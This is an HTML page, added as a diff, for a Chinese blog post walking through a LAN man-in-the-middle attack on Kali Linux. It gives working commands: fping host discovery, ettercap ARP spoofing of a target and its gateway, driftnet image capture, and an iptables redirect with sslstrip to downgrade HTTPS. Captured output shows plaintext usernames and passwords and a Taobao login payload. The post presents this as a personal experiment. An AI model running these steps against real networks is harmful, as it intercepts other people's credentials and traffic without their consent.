@@ -1,0 +1,874 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-corner-indicator.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="kali," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Lycon's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="记录一个最简单的局域网中间人攻击方法，在kali上实现。">
+<meta name="keywords" content="kali">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一个简单的中间人攻击(2)">
+<meta property="og:url" content="http://yoursite.com/2017/03/08/一个简单的中间人攻击-2/index.html">
+<meta property="og:site_name" content="Lycon&#39;s Blog">
+<meta property="og:description" content="记录一个最简单的局域网中间人攻击方法，在kali上实现。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2017/03/08/一个简单的中间人攻击-2/demo.png">
+<meta property="og:image" content="http://yoursite.com/2017/03/08/一个简单的中间人攻击-2/error.png">
+<meta property="og:image" content="http://yoursite.com/2017/03/08/一个简单的中间人攻击-2/taobao-http.png">
+<meta property="og:image" content="http://yoursite.com/2017/03/08/一个简单的中间人攻击-2/woman.png">
+<meta property="og:updated_time" content="2018-10-01T08:51:14.836Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一个简单的中间人攻击(2)">
+<meta name="twitter:description" content="记录一个最简单的局域网中间人攻击方法，在kali上实现。">
+<meta name="twitter:image" content="http://yoursite.com/2017/03/08/一个简单的中间人攻击-2/demo.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/03/08/一个简单的中间人攻击-2/"/>
+
+
+
+
+
+  <title>一个简单的中间人攻击(2) | Lycon's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+<!--<a href="https://github.com/lk361115629"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_red_aa0000.png" alt="Fork me on GitHub"></a>-->
+<a href="https://github.com/helloLycon" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Lycon's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">码农又在讨论种地用什么农具</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/03/08/一个简单的中间人攻击-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lycon's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">一个简单的中间人攻击(2)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-03-08T10:56:13+08:00">
+                2017-03-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,454
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  6
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>记录一个最简单的局域网中间人攻击方法，在<a href="https://www.kali.org/" target="_blank" rel="noopener">kali</a>上实现。</p>
+<a id="more"></a>
+<h2 id="搜索目标IP"><a href="#搜索目标IP" class="headerlink" title="搜索目标IP"></a>搜索目标IP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ fping -g 192.168.1.0/24</span><br><span class="line">192.168.1.1 is alive</span><br><span class="line">192.168.1.5 is alive</span><br><span class="line">192.168.1.200 is alive</span><br><span class="line">192.168.1.100 is alive</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p> <code>192.168.1.0</code>是网络地址，<code>24</code>是子网掩码<code>1</code>的位数。</p>
+</blockquote>
+<p>可以搜索出网段内可以ping通的主机，假设现在目标主机为<code>192.168.1.5</code>。</p>
+<h2 id="进行arp欺骗"><a href="#进行arp欺骗" class="headerlink" title="进行arp欺骗"></a>进行arp欺骗</h2><p>arp欺骗可以使用<code>arpspoof</code>命令，不过<code>ettercap</code>命令功能更强而且可以嗅探，这里就直接使用<code>ettercap</code>。</p>
+<blockquote>
+<p><code>ettercap</code>是有图形界面的，命令是<code>ettercap -G</code>，集成了更多功能，这里就简单介绍一下命令行方式。</p>
+</blockquote>
+<p>执行下面的命令，启动<code>ettercap</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ettercap -i eth0 -Tq -M arp:remote //192.168.1.5//  //192.168.1.1//</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><code>-i</code>指定了网卡；</li>
+<li><code>-T</code>选项是文本模式；</li>
+<li><code>-q</code>是安静模式；</li>
+<li><code>-M</code>也就是<code>--mitm</code>，man in the middle，中间人攻击，<code>arp:remote</code>指定了中间人攻击的模式；</li>
+<li>后面的ip，第一个为<code>目标主机</code>，第二个为<code>网关</code>。</li>
+</ul>
+<p>设置好这些参数后，你的笔记本会对目标主机和网管进行<strong>双向欺骗</strong>，也就是欺骗目标主机你是网关，同时欺骗网关你是目标主机，这样目标主机和网关之间的流量全部经过你的笔记本，你就可以用抓包工具（比如<code>wireshark</code>或者其他各种各样的）进行流量的嗅探了。</p>
+<h2 id="抓取明文账号-密码"><a href="#抓取明文账号-密码" class="headerlink" title="抓取明文账号/密码"></a>抓取明文账号/密码</h2><p>有些网站的账号密码是用明文的，由于刚刚<code>ettercap</code>指定的<code>-T</code>选项，会自动在终端上显示明文内容：</p>
+<blockquote>
+<p>现在的主流网站都用<code>https</code>协议加密了，明文传输的网站少之又少，基本都是一些没人管的网站了，这里我找到一个网站：<a href="http://www.wangming5.com/" target="_blank" rel="noopener">网名网</a>，可以用来实验这个抓取明文账号/密码的功能。</p>
+</blockquote>
+<p>进入他的登陆页面，输入账号和密码，这里我用账号<code>blablablabla</code>,密码<code>12345678</code>。<br><code>ettercap</code>命令的显示如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Starting Unified sniffing...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Text only Interface activated...</span><br><span class="line">Hit &apos;h&apos; for inline help</span><br><span class="line"></span><br><span class="line">HTTP : 122.114.69.160:80 -&gt; USER: blablablabla  PASS: 12345678  INFO: http://www.wangming5.com/e/member/login/</span><br><span class="line">HTTP : 122.114.69.160:80 -&gt; USER: blablablabla  PASS: 12345678  INFO: http://www.wangming5.com/e/member/login/</span><br><span class="line">CONTENT: ecmsfrom=&amp;enews=login&amp;tobind=0&amp;username=blablablabla&amp;password=12345678&amp;lifetime=604800</span><br><span class="line"></span><br><span class="line">CONTENT: ecmsfrom=&amp;enews=login&amp;tobind=0&amp;username=blablablabla&amp;password=12345678&amp;lifetime=604800</span><br></pre></td></tr></table></figure></p>
+<p>可以看到抓到了明文账号和密码。</p>
+<h2 id="抓取图片"><a href="#抓取图片" class="headerlink" title="抓取图片"></a>抓取图片</h2><p>抓取图片使用<code>driftnet</code>命令，在启动<code>ettercap</code>进行arp欺骗后执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ driftnet -i eth0</span><br></pre></td></tr></table></figure></p>
+<p>这个命令会打开一个窗口，直接显示抓到的图片；如果想要保存所有抓到的图片，可以使用<code>-a</code>选项保存所有图片，使用<code>-d</code>选项指定保存图片的路径，这里就用默认参数进行演示。</p>
+<blockquote>
+<p>同样的，只能抓使用<code>http</code>进行传输的图片，可以用<a href="http://www.163.com/" target="_blank" rel="noopener">网易主页</a>进行测试。</p>
+</blockquote>
+<p>效果如下：<br><img src="demo.png" alt=""></p>
+<p><strong>但是现在的主流网站都是用<code>https</code>协议了，用这种方法并不能抓到数据，怎么办呢。</strong></p>
+<h2 id="剥离https为http"><a href="#剥离https为http" class="headerlink" title="剥离https为http"></a>剥离https为http</h2><blockquote>
+<p><strong>SSL(Secure Sockets Layer)</strong>在传输层和应用层之间提供了一层安全协议，防止中间人窃听甚至修改数据。<code>https</code>、<code>sftp</code>、<code>scp</code>、<code>ssh</code>等协议都使用了<code>SSL</code>来提高安全性。</p>
+</blockquote>
+<h3 id="启用数据转发"><a href="#启用数据转发" class="headerlink" title="启用数据转发"></a>启用数据转发</h3><p>执行下面的命令，将<code>80端口</code>(http)的数据转发到<code>10000端口</code>(进行SSL剥离)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000</span><br></pre></td></tr></table></figure></p>
+<h3 id="启用SSL剥离"><a href="#启用SSL剥离" class="headerlink" title="启用SSL剥离"></a>启用SSL剥离</h3><p>执行下面的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sslstrip -l 10000</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>这个命令的作用就是攻击者接收到受害者的<code>http</code>封包后进行<code>https</code>封装发送给网站，接收到网站的<code>https</code>封包后解密发送给受害者，真正在上网的是攻击者，它是受害者的<code>https代理</code>。如果受害者访问的是<code>https://</code>的话，浏览器会提示证书错误，因为<code>数字证书</code>上的<code>数字签名</code>是无效的，我们需要再想办法伪造一个<code>数字证书</code>。</p>
+</blockquote>
+<p>好了，到此为止<code>ssl剥离</code>已经启用了，接下来可以在目标机器上进行测试了。</p>
+<h3 id="使用浏览器访问网站"><a href="#使用浏览器访问网站" class="headerlink" title="使用浏览器访问网站"></a>使用浏览器访问网站</h3><p>打开谷歌的<code>Chrome</code>浏览器，访问<code>www.taobao.com</code>：<br><img src="error.png" alt=""></p>
+<p>机智的<code>Chrome</code>可以发现攻击者，并且不允许你进入，这条路走不通，当然<code>Firefox</code>肯定也是这个结果；<br>换个好一点的浏览器吧，我在网上下载了大家都喜欢用的<code>360安全浏览器</code>，当然是最新版，用它进行访问：</p>
+<p><img src="taobao-http.png" alt=""></p>
+<p>淘宝居然变成了<code>http</code>，网址前面还出现了让人放心的<code>绿色标签</code>。看到这个基本上可以确定<code>SSL剥离</code>已经成功了，然后随便浏览一下，观察一下<code>driftnet</code>能不能抓到图片：</p>
+<p><img src="woman.png" alt=""><br>可以抓到图片了，再尝试一下登陆操作，看看刚刚启动的<code>ettercap</code>是否能抓到账户和密码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ ettercap -i eth0 -Tq -M arp:remote //192.168.1.5//  //192.168.1.1//</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">六 4月 07 14:54:22 2018 [driftnet] warning: image data too small (43 bytes) to bother with</span><br><span class="line">HTTP : 106.11.172.38:80 -&gt; USER: lk361115629  PASS:   INFO: http://login.taobao.com/member</span><br><span class="line">/login.jhtml?redirectURL=http://www.taobao.com/markets/nvzhuang/taobaonvzhuang?spm=a21bo.2</span><br><span class="line">017.201867-links-0.1.707111d9</span><br><span class="line">CONTENT: username=lk361115629&amp;ua=107%23ss%2F%2FkaS9sqQOFgbPyPAtXz91lnb0g%2F39QLb5TgwFgfhxX</span><br><span class="line">KGF%2Fe8vlXdqMN7yggwBzKG%2BPI9dIze%2FVVm%2BpaRfKNJgbKiisRGxWBGQxMNP7URQe3fMJZuJmOanNxbnEU5</span><br><span class="line">REOSXL0Tl8Txll3XhMmlhHw26FlIE8si6USs5XXE8OkOE%2FTFXXQ1%2BIKFdBX3XO8Xnl1SQXL0DscTEGrqXcTNnU</span><br><span class="line">E8pdJp3a%2FV0GNYwZgDTy9iP7xQyhvZQcFZPF9Hat3%2FweVQb8vpo7cnw%2B9iyhvZQcdaAhvi2UAjKvPi7hZQW6</span><br><span class="line">6H4kDYXcTNSQZaZbDQFZUeGt3iDe6V2Bf9yP5Fg37bqE21bF0FBbhMF3WYvt0egBQYg6lXkuBoXf06rF6F6bqLchhV</span><br><span class="line">rtvqi2yO6BH3mtZobELvX0vpyt3nErCi%2F3du3jF%2F6WcMWZdB8DB8jImueIYyewh%2BI32C22Ltmg9uTqx10cvd</span><br><span class="line">r9kXWbMnwCCVx87l7WHOH%2Bk9mukc9cd73F2q6EelUCCYwIkVVgygOgXpyhZNGc649x1V%2Fw%2FpwGujxC7VVgyg</span><br><span class="line">OgXp4G1ZpQ2Aq9JQnhVgrCUVxd0g%2BmD%2Bg5gqg3gxe10xq3c9krqnOCOgDI5QLgyjTgFQ28Bke10xq3vgjhVuwC</span><br><span class="line">CTd3292sTQmLDeghZsa0mUwFTtyCueqtupEe5n%2Bm9%2FABFCkucISvZZZ0dqgqzHIuWOv8kW27lOkiDTL3cJofc2</span><br><span class="line">vF1%2BAhn9GbW%2FGumXJ7QOyBjjztx7wF5kRIZQyhhqDb%2Ft1t6isii%2BTg9jj8ms8Qv7pl6p%2FCVghb%2Ft1t</span><br><span class="line">6isiTl%2FmiHOw6IqQm28D2EBe%2BhcuhVlodXJijyL2TT%2BuxvIfcPIv2rjqqWtuYnu8BttsBjM5X9VefNq0faaQ</span><br><span class="line">1ikeu%2FU9oj8wvjimDYK7EqmFdcbfmaMr2qgqs%2BeCOyCe1DS6T%2F4iXjz8dcbfmaM8JDkU%2FgUenVcudrZgiH</span><br><span class="line">syijj85Ge10xq3ZQja%2FnIG%2FQeUJjT69Q75gqg3gaIvJ7a929mpeThuujqI2qj7QyA7ECHoxUwl65dFJ%2FmwqK</span><br><span class="line">EurQC30CK7Q%2FjKHuToc8F9LZV8vV5aeybduQqIKlFVJgrskXYdTaH8TmNrEeipVeht%2FMXQgQxJlWL7ipEGvwec</span><br><span class="line">Z1r32EH3C%2BtvYMz3xljkB9L%2BcYnXlxWbLvRQ1bUMSY9lIzIxw3dP3QRPTqlXQxW</span><br></pre></td></tr></table></figure>
+<p>出现两个扎眼的关键字了，<code>USER:</code>和<code>username=</code>，后面跟的就是用户名，不过密码加密了，我也不知道怎么获得密码。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+	<div>
+	  
+		<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+	  
+	</div>
+	
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/kali/" rel="tag"><i class="fa fa-tag"></i> kali</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/03/01/摸索Kali-linux无线渗透-1/" rel="next" title="摸索Kali-linux无线渗透(1)">
+                <i class="fa fa-chevron-left"></i> 摸索Kali-linux无线渗透(1)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/01/c-随笔-set/" rel="prev" title="c++随笔(set)">
+                c++随笔(set) <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/helloLycon" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:lycon123@foxmail.com" target="_blank" title="邮箱">
+                      
+                        <i class="fa fa-fw fa-envelope"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/lycon361" target="_blank" title="微博">
+                      
+                        <i class="fa fa-fw fa-weibo"></i></a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://github.com/helloLycon" title="My Github [helloLycon]" target="_blank">My Github [helloLycon]</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.yinwang.org/" title="王垠的博客" target="_blank">王垠的博客</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#搜索目标IP"><span class="nav-number">1.</span> <span class="nav-text">搜索目标IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进行arp欺骗"><span class="nav-number">2.</span> <span class="nav-text">进行arp欺骗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#抓取明文账号-密码"><span class="nav-number">3.</span> <span class="nav-text">抓取明文账号/密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#抓取图片"><span class="nav-number">4.</span> <span class="nav-text">抓取图片</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#剥离https为http"><span class="nav-number">5.</span> <span class="nav-text">剥离https为http</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#启用数据转发"><span class="nav-number">5.1.</span> <span class="nav-text">启用数据转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#启用SSL剥离"><span class="nav-number">5.2.</span> <span class="nav-text">启用SSL剥离</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用浏览器访问网站"><span class="nav-number">5.3.</span> <span class="nav-text">使用浏览器访问网站</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+</div>
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共9.3k字</span>
+</div>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
